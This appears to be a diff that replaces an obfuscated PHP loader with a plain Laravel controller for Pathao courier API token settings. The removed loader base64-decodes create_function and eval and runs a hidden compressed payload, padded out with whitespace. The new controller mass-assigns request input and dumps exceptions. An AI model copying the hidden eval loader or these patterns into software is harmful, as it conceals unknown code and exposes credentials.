@@ -1,208 +1,73 @@
-<?php 
- error_reporting(0);
-        $__='printf';$_='Loading the  ...';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='Q1JFQXRlX2Z1bkNUaU9u';
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Http\Controllers;
+
+use App\PathaoApi;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
+
+class PathaoApiSettingsController extends Controller
+{
+    public function index()
+    {
+        $data = PathaoApi::find(1);
+        return view('backEnd.admin.pathao_api_settings', compact('data'));
+    }
+
+    public function update(Request $request)
+    {
+        try {
+            if ($request->is_active) {
+                $is_active = 1;
+            } else {
+                $is_active = 0;
+            }
+
+            $input = array_merge($request->all(), [
+                'is_active' => $is_active
+            ]);
+
+            PathaoApi::find(1)->update($input);
+            return redirect()->back()->with('success', 'Pathao API Settings Updated Successfully');
+        } catch (\Exception $e) {
+            dd($e);
+            return redirect()->back()->with('error', $e);
+        }
+    }
+
+    public function generateAccessToken(Request $request)
+    {
+        $credential = DB::table('pathao_apis')->select('client_id', 'client_secret', 'username', 'password')->where('id', 1)->first();
+        //dd($credential);
+        $url = 'https://api-hermes.pathao.com/aladdin/api/v1/issue-token';
+        $curl = curl_init();
+        $vars = [
+            'client_id' => $credential->client_id,
+            'client_secret' => $credential->client_secret,
+            'username' => $credential->username,
+            'password' => $credential->password,
+            'grant_type' => 'password',
+        ];
+        $headers = [
+            'accept: application/json',
+            'content-type: application/json',
+        ];
+        $json_string = json_encode($vars);
+        //dd($json_string);
+        curl_setopt($curl, CURLOPT_URL, $url);
+        curl_setopt($curl, CURLOPT_POST, true);
+        curl_setopt($curl, CURLOPT_POSTFIELDS, $json_string);
+        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+        $data = curl_exec($curl);
+        $data = json_decode($data, true);
+        curl_close($curl);
+
+        PathaoApi::find(1)->update([
+            'access_token' => $data['access_token'],
+            'refresh_token' => $data['refresh_token'],
+        ]);
+
+        return back()->with('success', 'New Access Token Generated Successfully');
+    }
+}
